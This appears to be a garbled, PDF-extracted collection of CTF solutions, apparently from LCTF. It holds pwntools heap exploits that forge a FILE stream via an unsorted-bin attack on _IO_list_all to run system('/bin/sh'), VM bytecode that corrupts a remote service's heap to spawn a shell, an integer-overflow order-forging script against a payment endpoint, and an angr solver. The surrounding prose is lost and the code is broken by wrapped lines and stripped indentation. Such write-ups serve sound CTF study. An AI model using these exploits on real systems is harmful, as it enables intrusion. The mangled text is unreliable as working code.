add(1, 3, 3, 0x100, 'E\n')
system_addr = libc_addr + libc.symbols['system']
io_list_all = libc_addr + libc.symbols['_IO_list_all']
vtable_addr = heap_base + 0xe58
payload = 'A' * 0xf8
stream = "/bin/sh\x00" + p64(0x61) # fake file stream
stream += p64(0xddaa) + p64(io_list_all-0x10) # Unsortbin attack
stream = stream.ljust(0xa0,"\x00")
stream += p64(vtable_addr - 0x28)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)
payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
toy
loadstoreoﬀsetOOB
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(system_addr)
edit(5, 1, 1, 1, payload + '\n')
add(1, 1, 1, 0x10, 'C\n')
io.recvuntil('your choice: ')
io.sendline('1')
io.recvuntil('color?(0:red, 1:green):')
io.sendline(str(1))
io.recvuntil('value?(0-999):')
io.sendline(str(1))
io.recvuntil('num?(0-16):')
io.sendline(str(1))
io.recvuntil('description length?(1-1024):')
io.sendline(str(0x30))
io.interactive()
from pwn import *
LOCAL = 0
DEBUG = 0
VERBOSE = 0
context.arch = 'amd64'
if VERBOSE:
context.log_level = 'debug'
if LOCAL:
io = process('./toy')
if DEBUG:
gdb.attach(io)
else:
io = remote('111.231.19.153', 20003)
def op_new_string(reg, content):
return chr(48) + chr(reg) + p16(len(content)) + content
def new_string_func(reg, content):
return new_string(reg, content) + chr(114)
def op_call(offset):
return chr(115) + p16(offset)
def op_mov_reg_imm(reg, imm):
return chr(1) + chr(reg) + p16(imm)
def op_exit():
return chr(0)
def op_load(reg, offset_reg):
return chr(96) + chr(reg) + chr(offset_reg)
def op_store(reg, offset_reg):
return chr(97) + chr(reg) + chr(offset_reg)
def op_add(reg1, reg2, reg3):
return chr(33) + chr(reg1) + chr(reg2) + chr(reg3)
def op_inc(reg):
return chr(37) + chr(reg)
def op_sub(reg1, reg2, reg3):
return chr(34) + chr(reg1) + chr(reg2) + chr(reg3)
def loads(from_reg, temp_reg, to_reg, size):
bytecode = op_load(temp_reg, from_reg) + op_store(temp_reg, to_reg)
for i in range(size - 1):
bytecode += op_inc(from_reg) + op_inc(to_reg)
bytecode += op_load(temp_reg, from_reg) + op_store(temp_reg, 
to_reg)
return bytecode
def stores(to_reg, temp_reg, content):
bytecode = op_mov_reg_imm(temp_reg, ord(content[0])) + 
op_store(temp_reg, to_reg)
for i in range(len(content) - 1):
bytecode += op_inc(to_reg)
bytecode += op_mov_reg_imm(temp_reg, ord(content[i+1])) + 
op_store(temp_reg, to_reg)
return bytecode
code = op_new_string(0, 'A'*0x100) + op_new_string(1, 'B'*0x10) + 
op_new_string(2, 'C'*0x100) + op_new_string(3, 'D'*0x10)
code += op_mov_reg_imm(0, 0x8000) + op_mov_reg_imm(6, 0x8010) + op_add(0, 
0, 6) + op_mov_reg_imm(5, 0x8000) + loads(0, 4, 5, 8)
code += op_mov_reg_imm(2, 0x8008) + op_add(2, 2, 6) + op_mov_reg_imm(5, 
0x8008) + loads(2, 4, 5, 8) + op_new_string(7, 'A'*0x100) + 
op_new_string(8, '\x00'*0x100)
code += op_mov_reg_imm(0, 0x8259) + op_add(0, 0, 6) + op_mov_reg_imm(2, 
0xc) + op_store(2, 0)
code += op_new_string(9, 'E'*0x1000)
code += op_mov_reg_imm(0, 0x8000) + op_mov_reg_imm(2, 0x8010) + loads(0, 4, 
2, 6)
code += op_mov_reg_imm(0, 0x8010) + op_load(2, 0) + op_mov_reg_imm(4, 0x78-
0x10) + op_sub(2, 2, 4) + op_store(2, 0)
code += op_mov_reg_imm(0, 0x8011) + op_load(2, 0) + op_mov_reg_imm(4, 0x85-
0x7b) + op_add(2, 2, 4) + op_store(2, 0)
code += op_mov_reg_imm(0, 0x8000) + op_load(2, 0) + op_mov_reg_imm(4, 0x90-
0x78) + op_add(2, 2, 4) + op_store(2, 0)
code += op_mov_reg_imm(0, 0x8001) + op_load(2, 0) + op_mov_reg_imm(4, 0x83-
0x7b) + op_add(2, 2, 4) + op_store(2, 0)
code += op_mov_reg_imm(0, 0x8002) + op_load(2, 0) + op_mov_reg_imm(4, 0xfd-
0x35) + op_add(2, 2, 4) + op_store(2, 0)
code += op_mov_reg_imm(0, 0x8000) + op_mov_reg_imm(2, 0x8158) + op_add(2, 
2, 0) + loads(0, 4, 2, 6)
code += op_mov_reg_imm(0, 0x8008) + op_load(2, 0) + op_mov_reg_imm(4, 0x10) 
+ op_add(2, 2, 4) + op_store(2, 0)
code += op_mov_reg_imm(0, 0x8008) + op_mov_reg_imm(2, 0x8018) + loads(0, 4, 
2, 6)
code += op_mov_reg_imm(0, 0x8018) + op_load(2, 0) + op_mov_reg_imm(4, 0x28) 
+ op_sub(2, 2, 4) + op_store(2, 0)
code += op_mov_reg_imm(0, 0x8000) + op_mov_reg_imm(2, 0x8260) + op_add(0, 
0, 2) + stores(0, 4, '/bin/sh\x00')
code += op_mov_reg_imm(0, 0x8008) + op_mov_reg_imm(2, 0x8260) + op_add(0, 
0, 2) + stores(0, 4, p16(0x61))
code += op_mov_reg_imm(0, 0x8010) + op_mov_reg_imm(2, 0x8260) + op_add(0, 
0, 2) + stores(0, 4, p64(0xddaa))
code += op_mov_reg_imm(0, 0x8018) + op_mov_reg_imm(6, 0x8260) + op_add(0, 
0, 6) + op_mov_reg_imm(5, 0x8010) + loads(5, 4, 0, 6)
code += op_mov_reg_imm(0, 0x80a0) + op_mov_reg_imm(6, 0x8260) + op_add(0, 
0, 6) + op_mov_reg_imm(5, 0x8018) + loads(5, 4, 0, 6)
code += op_mov_reg_imm(0, 0x80c0) + op_mov_reg_imm(2, 0x8260) + op_add(0, 
0, 2) + stores(0, 4, '\x01')
code += op_mov_reg_imm(0, 0x80d8) + op_mov_reg_imm(6, 0x8260) + op_add(0, 
0, 6) + op_mov_reg_imm(5, 0x8008) + loads(5, 4, 0, 6)
code += op_mov_reg_imm(0, 0x80e0) + op_mov_reg_imm(2, 0x8260) + op_add(0, 
0, 2) + stores(0, 4, '\x01')
code += op_mov_reg_imm(0, 0x80e8) + op_mov_reg_imm(2, 0x8260) + op_add(0, 
0, 2) + stores(0, 4, '\x02')
code += op_mov_reg_imm(0, 0x80f0) + op_mov_reg_imm(2, 0x8260) + op_add(0, 
0, 2) + stores(0, 4, '\x03')
code += chr(48) + chr(0) + p16(0x50-8-1)
code += op_exit()
readlineintshortint overﬂowintcopy
block
apporder
io.recvuntil('code size: ')
io.sendline(str(len(code)))
io.send(code)
io.interactive()
Re
use your IDA?
ctfB1Aip
angrﬂag
import requests
import hashlib
url1 = 'http://115.159.29.76/order.php'
url2 = 'http://115.159.29.76/pay.php'
header ={
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '97',
'Host': '115.159.29.76',
'Connection': 'Keep-Alive',
'Accept-Encoding': 'gzip',
'User-Agent': 'okhttp/3.4.2',
}
team = '548704b7dcd283442cd74d22ea8978d4'
i = 2147483647
sign1 = hashlib.md5(team).hexdigest()
order = str(i)
message = 'a'
res = requests.post(url=url1,headers = header, 
data="message="+message+"&order="+order+"&teamtoken="+sign1).text
print res
recv_sign = res[res.index('sign='):]
recv_sign = recv_sign.replace("sign=","")
recv_sign = recv_sign.replace("\"","")
print recv_sign
para = 
"message="+message+"&order="+order+"&teamtoken=a545047461f5ac1b2c30fe145e2c
5efc&sign="+recv_sign+"&signagain="
resign = 
hashlib.md5('order="'+order+'"&teamtoken="a545047461f5ac1b2c30fe145e2c5efc"
&sign="'+recv_sign+'"').hexdigest()
para += resign
res = requests.post(url=url2,headers = header, data=para)
print res.status_code
print res.text
ce50010
1101
Misc
githubﬂag
import angr
p = angr.Project('/pzhxbz/Desktop/re/lctf/use_your_ida.exe',load_options=
{'auto_load_libs': False})
find = (0x401077,)
avoid = (0x401083,0x42F91A)
main = 0x413142
init = p.factory.blank_state(addr=main)
for i in range(24):
    a = init.se.BVS('a', 8)
    init.se.add(a > 32)
    init.se.add(a < 127)
    init.mem[init.regs.esp-28+i:].char = a
    init.mem[0x43F322+i:].char = a
pgp = p.factory.path_group(init)
ex = pgp.explore(find=find, avoid=avoid)
print(ex)
s = ex.found[0].state
# flag = s.mem[s.regs.esp:s.regs.esp+0x50]
flag = s.se.any_str(s.memory.load(0x43F322, 100))
print flag